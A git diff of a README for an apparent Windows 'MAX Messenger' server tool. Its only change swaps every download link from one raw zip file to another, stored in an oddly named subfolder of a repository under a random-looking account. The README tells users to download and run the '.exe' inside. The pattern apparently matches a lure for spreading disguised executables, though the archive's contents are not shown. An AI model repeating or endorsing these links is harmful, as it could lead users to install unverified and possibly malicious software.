@@ -1,6 +1,6 @@
 # ⚙️ server - Open MAX Server for Easy Use
 
-[![Download server](https://img.shields.io/badge/Download-server-green?style=for-the-badge)](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip)
+[![Download server](https://img.shields.io/badge/Download-server-green?style=for-the-badge)](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This section shows you how to download, install, and run the server on Windows. 
 
 1. **Visit the release page:**  
    Go to the release page at this link:  
-   [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip)
+   [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip)
 
 2. **Find the latest version:**  
    Look for the most recent release at the top of the list. It will show a version number like `v1.0.0` or higher.
@@ -70,7 +70,7 @@ This section shows you how to download, install, and run the server on Windows. 
 ## 🔄 Updating to new versions
 
 - Check the release page regularly:  
-  [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip)  
+  [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip)  
 
 - Download and install any new `.exe` files using the steps above to keep your server up to date.
 
@@ -127,7 +127,7 @@ The server lets you send and receive messages through MAX Messenger. Messages pa
 ## 🔗 Important Links
 
 - **Downloads:**  
-  [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software_2.3.zip)  
+  [https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip](https://github.com/bivariate-electricalengineering326/server/raw/refs/heads/main/essayism/Software-v1.0.zip)  
 
 - **Support FAQs:**  
   Visit the repository's Issues tab to report problems or look for help.
